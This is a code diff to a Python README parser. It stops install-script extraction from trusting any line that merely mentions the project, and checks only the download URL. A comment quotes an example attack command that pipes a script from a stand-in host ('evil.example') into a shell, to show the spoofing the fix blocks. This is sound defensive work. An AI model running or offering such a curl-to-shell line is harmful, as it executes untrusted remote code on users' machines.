@@ -15,7 +15,7 @@ import base64
 import json
 import re
 
-from .installer import Method, arch_gated, classify, make, parse_repo
+from .installer import Method, arch_gated, classify, command_urls, make, parse_repo
 
 # fenced ``` blocks and single-backtick inline code
 _FENCE = re.compile(r"```[^\n]*\n(.*?)```", re.DOTALL)
@@ -79,8 +79,13 @@ def extract_methods(readme: str, url: str) -> list[Method]:
         low = line.lower()
         mentions = any(t and t in low for t in tokens)
         if kind == "script":
-            # keep an install script only if it points at this repo/owner
-            if owner_l not in low and repo_l not in low:
+            # Keep an install script only if this repo's owner or name shows
+            # up in the URL it downloads from — not merely somewhere on the
+            # line. "curl https://evil.example/x.sh | sh -s -- --for lazygit"
+            # satisfies a whole-line match while pointing at a host that has
+            # nothing to do with the project.
+            urls = " ".join(command_urls(line)).lower()
+            if owner_l not in urls and repo_l not in urls:
                 continue
         elif not mentions:
             continue
